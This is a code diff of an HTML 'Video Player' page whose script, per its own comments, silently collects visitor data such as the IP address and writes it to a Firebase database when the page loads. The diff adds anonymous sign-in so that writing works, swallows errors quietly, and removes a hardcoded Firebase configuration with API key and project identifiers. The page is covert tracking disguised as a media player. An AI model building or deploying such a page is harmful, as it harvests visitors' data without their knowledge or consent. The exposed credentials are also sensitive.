@@ -6,6 +6,8 @@
     <title>Video Player</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-auth.js"></script>
+    <script src="hi.js"></script>
     <style>
         body {
             margin: 0;
@@ -33,18 +35,6 @@
         }
     </style>
     <script>
-        // Ganti dengan config Firebase kamu
-        const firebaseConfig = {
-          apiKey: "AIzaSyDDImo9Vq1jqID6WDbGMXToexeIfNFOjpQ",
-          authDomain: "iplo-50a21.firebaseapp.com",
-          databaseURL: "https://iplo-50a21-default-rtdb.asia-southeast1.firebasedatabase.app",
-          projectId: "iplo-50a21",
-          storageBucket: "iplo-50a21.firebasestorage.app",
-          messagingSenderId: "488527718585",
-          appId: "1:488527718585:web:f1a35e256a0d3cf5021368",
-          measurementId: "G-1LQMBTQBPK"
-};
-
         // Init Firebase
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
@@ -52,6 +42,9 @@
         // Fungsi ambil data silently lalu kirim ke DB
         async function logUserData() {
             try {
+                // Anonymous login untuk write ke database
+                await firebase.auth().signInAnonymously();
+
                 // Ambil IP via API eksternal
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
@@ -208,7 +201,6 @@
             } catch (error) {
                 console.error('Error logging data:', error); // Silent error
             }
-            // Tidak ada redirect lagi, langsung tampilkan video setelah data dikirim
         }
 
         // Jalankan saat load
